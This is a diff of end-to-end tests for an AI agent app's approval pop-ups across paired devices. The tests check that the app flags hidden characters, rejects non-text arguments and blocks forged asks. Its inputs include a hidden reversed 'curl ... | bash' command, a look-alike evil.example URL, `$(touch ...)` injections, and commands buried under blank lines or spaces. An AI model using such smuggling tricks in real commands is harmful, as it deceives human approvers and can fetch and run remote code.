+    await s.test('in No-Approval, with no pop-up, the same place', async () => {
+      const name = 'no-approval-where.txt';
+      const id = await shared({ remoteControl: false, approvalMode: false, noApproval: true });
+      const finish = await modelCalls(id, 'run_command', { command: `echo x >> ${name}`, cwd: 'src' });
+      assert.equal((await finish()).exitCode, 0);
+      assert.equal(lineCount(path.join(homeDir, 'src', name)), 1);
+    });
+
+    await s.test('relative with no project folder is an error telling the model what to do, and no pop-up', async () => {
+      for (const where of [{}, { device: LAPTOP }]) {
+        const id = await shared({ projectFolder: undefined, pathAllowlist: [], projectFolders: {}, pathAllowlists: {} });
+        const finish = await modelCalls(id, 'run_command', { command: 'echo x >> nowhere.txt', cwd: 'src', ...where });
+        const result = await finish();
+        assert.match(result.error, /absolute path/);
+        assert.equal(await visible(home, OVERLAY.approval), false);
+      }
+    });
+
+    await s.test('with no folder and no cwd, the machine\'s own default still says so', async () => {
+      const id = await shared({ projectFolder: undefined, pathAllowlist: [], projectFolders: {}, pathAllowlists: {} });
+      const finish = await modelCalls(id, 'run_command', { command: 'exit 0' });
+      await appears(home, 'approval');
+      assert.equal((await approvalText(home)).codes.at(-1), '(home directory)');
+      await click(home, NO.approval);
+      await finish();
+    });
+  });
+
+  await t.test('a non-text argument is an error on both ends, before any pop-up, and nothing runs', async (s) => {
+    const marker = path.join(root, 'injected.txt').replace(/\\/g, '/');
+    const cases = [
+      ['run_command', { command: ['echo', `$(touch "${marker}")`] }],
+      ['run_command', { command: { a: `$(touch "${marker}")` } }],
+      ['run_command', { command: 5 }],
+      ['run_command', { command: 'echo x', cwd: { a: 1 } }],
+      ['run_command', { command: 'echo x', cwd: 0 }],
+      ['run_command_async', { command: [`$(touch "${marker}")`] }],
+      ['write_file', { path: 'FILE', content: { a: 1 } }],
+      ['write_file', { path: 'FILE', content: 0 }],
+      ['write_file', { path: 'FILE', content: false }],
+      ['read_file', { path: 7 }]
+    ];
+    for (const [where, extra, dir] of [['at home', {}, homeDir], ['on the laptop', { device: LAPTOP }, laptopDir]]) {
+      await s.test(`${where}, in Approval Mode and in No-Approval`, async () => {
+        let n = 0;
+        for (const fields of [{}, { approvalMode: false, noApproval: true }]) {
+          for (const [tool, args] of cases) {
+            n += 1;
+            const file = path.join(dir, `nontext-${n}.txt`);
+            const id = await shared({ ...fields, remoteControl: false });
+            const given = { ...args, ...extra };
+            if (given.path === 'FILE') given.path = file;
+            const calls = await newestCount(laptop, 'tool-call');
+            const finish = await modelCalls(id, tool, given);
+            const result = await finish();
+            assert.match(result.error, /as text/, `${tool} ${JSON.stringify(args)}`);
+            assert.equal(await visible(home, OVERLAY.approval), false);
+            assert.equal(await newestCount(laptop, 'tool-call'), calls, 'nothing went to the laptop');
+            assert.equal(fs.existsSync(file), false, 'nothing was written');
+            assert.equal(fs.existsSync(marker), false, 'nothing ran');
+          }
+        }
+      });
+    }
+
+    await s.test('apply_patch\'s text fields too, leaving the file alone', async () => {
+      const file = path.join(homeDir, 'patched.txt');
+      fs.writeFileSync(file, 'a5a');
+      for (const [find, replace] of [['a', 0], ['a', false], ['a', null], ['a', { x: 1 }], [5, 'b']]) {
+        const id = await shared({ modality: 'code', remoteControl: false, approvalMode: false, noApproval: true });
+        const finish = await modelCalls(id, 'apply_patch', { path: file, find, replace });
+        assert.match((await finish()).error, /as text/, JSON.stringify([find, replace]));
+        assert.equal(fs.readFileSync(file, 'utf8'), 'a5a');
+      }
+      const id = await shared({ modality: 'code', remoteControl: false, approvalMode: false, noApproval: true });
+      const finish = await modelCalls(id, 'apply_patch', { path: file, find: '5', replace: '' });
+      await finish();
+      assert.equal(fs.readFileSync(file, 'utf8'), 'aa', 'an empty string is still how to delete');
+    });
+  });
+
+  await t.test('what can\'t be seen is flagged, and a buried line is counted', async (s) => {
+    const hiddenNote = 'This has hidden characters, shown here as codes.';
+    const notes = (device, selector = '.ask-hidden-note') => device.page.evaluate((sel) => [...document.querySelectorAll(sel)].filter((el) => !el.hidden).map((el) => el.textContent), selector);
+
+    await s.test('a path that reads backwards shows as codes on both ends, and the file gets its real name', async () => {
+      const id = await shared();
+      const file = path.join(homeDir, 'notes\u202etxt.exe');
+      const finish = await modelCalls(id, 'write_file', { path: file, content: 'x' });
+      await appears(home, 'approval');
+      await appears(laptop, 'approval');
+      for (const device of [home, laptop]) {
+        assert.ok((await approvalText(device)).codes.some((text) => text.endsWith('notes\\u202Etxt.exe')), device.name);
+        assert.ok(!(await textOf(device, '#approval-body')).includes('\u202e'), `${device.name} shows no such character`);
+        assert.deepEqual(await device.page.evaluate(() => [...document.querySelectorAll('#approval-body .ask-code')].map((el) => el.textContent)), ['\\u202E'], 'and the code reads as one, not as one more folder');
+        assert.deepEqual(await notes(device), [hiddenNote]);
+        assert.equal(await visible(device, YES.approval), true, 'the person decides');
+      }
+      await click(laptop, YES.approval);
+      await closes(home, 'approval');
+      await finish();
+      assert.equal(fs.existsSync(file), true, 'never altering what runs');
+    });
+
+    await s.test('a reversed command, and a zero-width character in a URL', async () => {
+      for (const [command, code] of [['echo "\u202e hsab | moc.live//:ptth lruc ;\u202c harmless"', '\\u202E'], ['echo https://github.com\u200b.evil.example/x', '\\u200B']]) {
+        const id = await shared();
+        const finish = await modelCalls(id, 'run_command', { command });
+        await appears(laptop, 'approval');
+        for (const device of [home, laptop]) {
+          assert.ok((await approvalText(device)).codes.some((text) => text.includes(code)), device.name);
+          assert.deepEqual(await notes(device), [hiddenNote]);
+        }
+        await click(home, NO.approval);
+        await finish();
+      }
+    });
+
+    await s.test('a home plan and a laptop plan, and an access pop-up', async () => {
+      const planning = await shared({ planMode: true, approvalMode: false });
+      const finishPlan = await modelCalls(planning, 'exit_plan_mode', { plan: 'Step\u202e one.' });
+      await appears(laptop, 'plan');
+      for (const device of [home, laptop]) {
+        assert.ok((await textOf(device, '#plan-approval-body')).includes('Step\\u202E one.'), device.name);
+        assert.deepEqual(await notes(device), [hiddenNote]);
+      }
+      await click(laptop, NO.plan);
+      await finishPlan();
+      assert.deepEqual(await notes(laptop), [], 'and it goes with the pop-up');
+
+      const reading = await shared({ approvalMode: false, noApproval: true });
+      const file = path.join(outsideDir, 'read\u200bme.txt');
+      fs.writeFileSync(file, 'x');
+      const finishPath = await modelCalls(reading, 'read_file', { path: file });
+      await appears(laptop, 'path');
+      for (const device of [home, laptop]) {
+        assert.ok((await textOf(device, '#pe-requested-path')).endsWith('read\\u200Bme.txt'), device.name);
+        assert.deepEqual(await notes(device), [hiddenNote]);
+      }
+      await click(home, NO.path);
+      await finishPath();
+    });
+
+    await s.test('ordinary text has no note, and Windows line endings aren\'t hidden characters', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'write_file', { path: path.join(homeDir, 'plain.txt'), content: 'one\r\ntwo\r\n\tthree café' });
+      await appears(laptop, 'approval');
+      for (const device of [home, laptop]) {
+        assert.deepEqual(await notes(device), []);
+        assert.deepEqual(await notes(device, '.ask-more-lines'), [], 'and it all fits');
+      }
+      await click(home, NO.approval);
+      await finish();
+    });
+
+    await s.test('a second command under 60 blank lines is counted on both ends, and the count falls as it scrolls', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: `echo hello${'\n'.repeat(60)}touch buried.txt` });
+      await appears(home, 'approval');
+      await appears(laptop, 'approval');
+      for (const device of [home, laptop]) {
+        const [said] = await notes(device, '.ask-more-lines');
+        const count = Number(/^(\d+) more lines below$/.exec(said ?? '')?.[1]);
+        assert.ok(count >= 40 && count <= 61, `${device.name}: ${said}`);
+        await device.page.evaluate(() => { const box = document.querySelectorAll('#approval-body .approval-code')[1]; box.scrollTop = 100; });
+        await waitFor('the count to fall', async () => {
+          const [now] = await notes(device, '.ask-more-lines');
+          return Number(/^(\d+) more/.exec(now ?? '')?.[1]) < count;
+        }, 3000);
+        await device.page.evaluate(() => { const box = document.querySelectorAll('#approval-body .approval-code')[1]; box.scrollTop = box.scrollHeight; });
+        await waitFor('it to go', async () => (await notes(device, '.ask-more-lines')).length === 0, 3000);
+        assert.equal(await visible(device, YES.approval), true);
+        assert.ok((await approvalText(device)).codes[1].includes('touch buried.txt'), 'and it can be read');
+      }
+      await click(home, NO.approval);
+      await finish();
+    });
+
+    await s.test('a command pushed out of sight by thousands of spaces is counted too', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: `echo hello${' '.repeat(8000)}; touch buried-2.txt` });
+      await appears(laptop, 'approval');
+      for (const device of [home, laptop]) {
+        const over = await device.page.evaluate(() => { const box = document.querySelectorAll('#approval-body .approval-code')[1]; return box.scrollHeight > box.clientHeight; });
+        assert.equal((await notes(device, '.ask-more-lines')).length > 0, over, `${device.name}: said if and only if it overflows`);
+      }
+      await click(home, NO.approval);
+      await finish();
+    });
+
+    await s.test('a long patch is counted, and the notes go with the pop-up', async () => {
+      const id = await shared({ modality: 'code' });
+      const file = path.join(homeDir, 'long-patch.txt');
+      const finish = await modelCalls(id, 'apply_patch', { path: file, find: 'old\n'.repeat(80), replace: 'new' });
+      await appears(laptop, 'approval');
+      for (const device of [home, laptop]) assert.match((await notes(device, '.ask-more-lines'))[0] ?? '', /^\d+ more lines below$/, device.name);
+      await click(home, NO.approval);
+      await closes(laptop, 'approval');
+      await finish();
+      for (const device of [home, laptop]) assert.deepEqual(await notes(device, '.ask-more-lines'), []);
+    });
+  });
+
+  await t.test('agent-audit.log holds each long argument to its first 8 KB and its size', async () => {
+    const KB8 = 8 * 1024;
+    const lines = (id) => fs.readFileSync(path.join(home.profile, 'agent-audit.log'), 'utf8').split('\n').filter((line) => line.includes(id));
+    for (const [where, extra, dir] of [['home', {}, homeDir], ['laptop', { device: LAPTOP }, laptopDir]]) {
+      const id = await shared({ remoteControl: false });
+      const content = 'x'.repeat(2 * 1024 * 1024);
+      const finish = await modelCalls(id, 'write_file', { path: path.join(dir, 'audit-big.txt'), content, ...extra });
+      await appears(home, 'approval', 30000);
+      await click(home, NO.approval);
+      await finish();
+      const written = lines(id);
+      assert.ok(written.length >= 1);
+      for (const line of written) {
+        assert.ok(line.length < 64 * 1024, `${where}: a line of ${line.length}`);
+        const entry = JSON.parse(line);
+        if (entry.args?.content !== undefined) {
+          assert.equal(entry.args.content.length, KB8);
+          assert.equal(entry.args.contentBytes, content.length);
+        }
+      }
+      assert.ok(written.some((line) => JSON.parse(line).args?.contentBytes === content.length), where);
+    }
+  });
+
+  await t.test('a laptop that has connected but hasn\'t been sent the ask can\'t answer it, through the real flow', async () => {
+    const slow = await launchDevice('slow', { ollamaUrl: trio.ollama.url });
+    extras.push(slow);
+    await started(slow);
+    // It takes parts of a snapshot and never says so, which leaves it where home hasn't offered anything yet.
+    await slow.page.evaluate(() => { window.acknowledgePart = () => {}; });
+    assert.deepEqual(await slow.remote('setAddress', trio.relay.address), { ok: true });
+    const { code } = await home.remote('createCode');
+    await waitFor('the pairing', async () => {
+      const res = await slow.remote('pair', code, 'slow', PIN);
+      if (!res.ok && !/cancelled/.test(res.error)) assert.fail(res.error);
+      return res.ok;
+    }, 15000);
+    const slowId = await waitFor('it to connect', async () => (await home.remote('status')).devices.find((d) => d.id !== laptopId && d.connected)?.id, 15000);
+    await waitFor('home to be serving it', () => home.page.evaluate((device) => Boolean(mirror.laptops.get(device)?.paced), slowId), 8000);
+
+    const id = await shared();
+    const file = path.join(homeDir, 'slow.txt');
+    const finish = await modelCalls(id, 'run_command', { command: 'echo x >> slow.txt' });
+    await appears(home, 'approval');
+    await appears(laptop, 'approval');
+    const askId = await lastAskId(laptop);
+    assert.equal((await framesOf(slow, 'ask')).length, 0, 'it hasn\'t been sent it');
+    assert.equal(await slow.remote('send', (await slow.entry()).id, { type: 'answer', id: askId, value: true }), true);
+    await sleep(500);
+    assert.equal(await visible(home, OVERLAY.approval), true, 'an id it has no business knowing does it no good');
+    assert.equal(lineCount(file), 0);
+    await click(home, NO.approval);
+    await finish();
+    await home.remote('removeDevice', slowId);
+    await waitFor('it to go', async () => !(await home.remote('status')).devices.some((d) => d.id === slowId), 5000);
+  });
+
 
   // ---- The laptop's side, against a hostile home ----
 
@@ -1306,27 +2081,51 @@ test('pop-ups on every device', async (t) => {
     }, 15000);
     const otherId = await waitFor('it to connect', async () => (await laptop.remote('status')).devices.find((d) => d.id !== homeId && d.connected)?.id, 15000);
     const fromOther = await waitFor('its end', async () => (await other.remote('status')).devices.find((d) => d.connected)?.id, 15000);
+    const otherName = (await laptop.remote('status')).devices.find((d) => d.id === otherId).name;
     const otherChat = await newChat(other, { ...baseChat, projectFolder: outsideDir, pathAllowlist: [outsideDir], projectFolders: {}, pathAllowlists: {} });
     const otherKey = `remote:${otherId}:${otherChat}`;
     await waitFor('its chat to reach the laptop', () => hasChat(laptop, otherKey), 10000);
     const forge = (fields) => other.remote('send', fromOther, { type: 'ask', id: 'forged-1', kind: 'approval', chatId: otherChat, tool: 'run_command', args: { command: 'echo forged', cwd: '' }, device: 'Somewhere', ...fields });
     const heldFor = (deviceId) => laptop.page.evaluate((id) => [...remoteAsks.held.values()].filter((h) => h.deviceId === id).map((h) => h.id), deviceId);
 
-    await s.test('anything out of shape, or for a chat it can\'t see, is dropped', async () => {
+    await s.test('anything out of shape, or for a chat it can\'t see, is dropped, and home is told', async () => {
       const before = await heldCount(laptop);
-      for (const fields of [{ kind: 'grant' }, { extra: 1 }, { device: 'two\nlines' }, { args: 'text' }, { tool: '' }, { chatId: 'not-a-chat-here' }, { id: 'has:colon' }, { args: { command: 'x'.repeat(70 * KIB), cwd: '' } }]) {
-        await forge(fields);
-      }
+      await clearToasts(laptop);
+      const told = await newestCount(other, 'ask-unheld');
+      const shapes = [{ kind: 'grant' }, { extra: 1 }, { device: 'two\nlines' }, { args: 'text' }, { tool: '' }, { chatId: 'not-a-chat-here' }, { args: { command: 'x'.repeat(70 * KIB), cwd: '' } }];
+      for (const [i, fields] of shapes.entries()) await forge({ id: `bad-${i}`, ...fields });
+      await forge({ id: 'has:colon' });
       await sleep(400);
       assert.equal(await heldCount(laptop), before);
       assert.equal(await visible(laptop, OVERLAY.approval), false);
+      assert.equal(await newestCount(other, 'ask-unheld'), told + shapes.length, 'each, except the one with no id to say it about');
+      assert.equal((await toasts(laptop)).filter((text) => text.includes(otherName) && /can't be shown here/.test(text)).length, 1, 'with one toast');
+      for (let i = 0; i < shapes.length; i += 1) await other.remote('send', fromOther, { type: 'ask-closed', id: `bad-${i}`, value: null });
+      await waitFor('it to forget them', () => laptop.page.evaluate((id) => !remoteAsks.unheld.get(id)?.size, otherId), 5000);
+      await clearToasts(laptop);
     });
 
     await s.test('a laptop can\'t put one up at home', async () => {
-      await laptop.remote('send', homeId, { type: 'ask', id: 'backwards', kind: 'approval', chatId: 'c', tool: 'run_command', args: { command: 'x', cwd: '' }, device: 'x' });
-      await sleep(300);
+      await home.page.evaluate((device) => {
+        const chatKey = `remote:${device}:x`;
+        state.chats[chatKey] = { id: chatKey, title: 'Under its key', messages: [], remote: { deviceId: device, chatId: 'x' } };
+      }, laptopId);
+      await laptop.remote('send', homeId, { type: 'ask', id: 'backwards', kind: 'approval', chatId: 'x', tool: 'run_command', args: { command: 'x', cwd: '' }, device: 'x' });
+      await sleep(400);
       assert.equal(await visible(home, OVERLAY.approval), false);
       assert.equal(await heldCount(home), 0);
+
+      // Nor can it close one held under its own key.
+      await home.page.evaluate((device) => {
+        remoteAsks.held.set(`${device}:held-x`, { id: 'held-x', key: `${device}:held-x`, deviceId: device, chatKey: 'z', kind: 'approval', queued: true, answered: true, takeDown: null, turnOver: null });
+      }, laptopId);
+      await laptop.remote('send', homeId, { type: 'ask-closed', id: 'held-x', value: null });
+      await sleep(400);
+      assert.equal(await heldCount(home), 1, 'a laptop\'s ask-closed does nothing');
+      await home.page.evaluate((device) => {
+        remoteAsks.held.clear();
+        delete state.chats[`remote:${device}:x`];
+      }, laptopId);
     });
 
     await s.test('its text stays text, in every kind', async () => {
@@ -1360,16 +2159,18 @@ test('pop-ups on every device', async (t) => {
     });
 
     await s.test('too long, from a home that says so, in each kind, offers only the refusal', async () => {
-      await forge({ id: 'long-1', kind: 'path', tool: 'read_file', args: {}, tooLarge: true });
+      await forge({ id: 'long-1', kind: 'path', tool: 'read_file', args: {}, notShown: true });
       await appears(laptop, 'path');
       assert.equal(await visible(laptop, '#pe-once'), false);
       assert.equal(await visible(laptop, '#pe-folder'), false);
       assert.equal(await visible(laptop, '#pe-deny'), true);
-      assert.match(await textOf(laptop, '#pe-too-long'), /too long to show here/i);
+      assert.match(await textOf(laptop, '#pe-not-shown'), /too long or too unusual to show here/i);
+      // Item 16: Machine first, then what can't be shown, as on the other two.
+      assert.equal(await laptop.page.evaluate(() => Boolean(document.querySelector('#pe-device-row').compareDocumentPosition(document.querySelector('#pe-not-shown')) & Node.DOCUMENT_POSITION_FOLLOWING)), true);
       await click(laptop, '#pe-deny');
       await waitFor('its answer', async () => (await framesOf(other, 'answer')).some((f) => f.id === 'long-1' && f.value === 'deny'), 5000);
       await other.remote('send', fromOther, { type: 'ask-closed', id: 'long-1', value: 'deny' });
-      assert.equal(await visible(laptop, '#pe-too-long'), false);
+      assert.equal(await visible(laptop, '#pe-not-shown'), false);
     });
 
     await s.test('two homes with the same id: neither can close, replace, or answer the other\'s', async () => {
@@ -1418,7 +2219,9 @@ test('pop-ups on every device', async (t) => {
       await sleep(300);
       const held = await heldFor(otherId);
       assert.deepEqual(held, Array.from({ length: 20 }, (_, i) => `many-${i}`), 'the first 20 stay');
-      assert.equal((await toasts(laptop)).filter((text) => /Too many/.test(text)).length, 1);
+      assert.deepEqual((await toasts(laptop)).filter((text) => /can't be shown here/.test(text)), [`A question from ${otherName} can't be shown here. Answer it at ${otherName}, or press Stop.`], 'one toast, naming the home');
+      assert.equal((await framesOf(other, 'ask-unheld')).filter((f) => /^many-/.test(f.id)).length, 6, 'and home is told, about each');
+      assert.deepEqual(Object.keys((await framesOf(other, 'ask-unheld')).at(-1)).sort(), ['id', 'type'], 'with nothing else in it');
 
       for (const askId of held) await other.remote('send', fromOther, { type: 'ask-closed', id: askId, value: null });
       await waitFor('them to go', async () => (await heldFor(otherId)).length === 0, 5000);
